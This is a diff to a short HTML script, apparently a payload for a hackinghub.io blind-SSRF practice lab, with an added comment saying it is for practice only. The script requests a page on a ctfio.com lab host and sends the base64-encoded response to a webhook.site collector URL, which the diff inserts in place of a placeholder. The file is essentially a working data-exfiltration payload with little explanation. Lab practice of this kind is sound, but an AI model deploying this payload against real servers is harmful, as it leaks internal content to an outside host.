@@ -1,8 +1,9 @@
+<!-- Note this script is being used to practice in hackinghub.io blind ssrf and not anything else-->
 <script>
     exfil = new XMLHttpRequest();
     // Set the correct server below e.g https://abcdefg.ctfio.com
     exfil.open("GET","https://coulouris.ctfio.com/blind/recipe");
     exfil.send();
     // put your colab instance below to you can capture the contents of /blind/recipe
-    exfil.onload = function(){ document.write('<img src="{colab_instance}}/?x=' + btoa(this.responseText) + '">'); }
+    exfil.onload = function(){ document.write('<img src="https://webhook.site/8382bed2-e117-4979-9173-6a4e13452bd2/?x=' + btoa(this.responseText) + '">'); }
 </script>
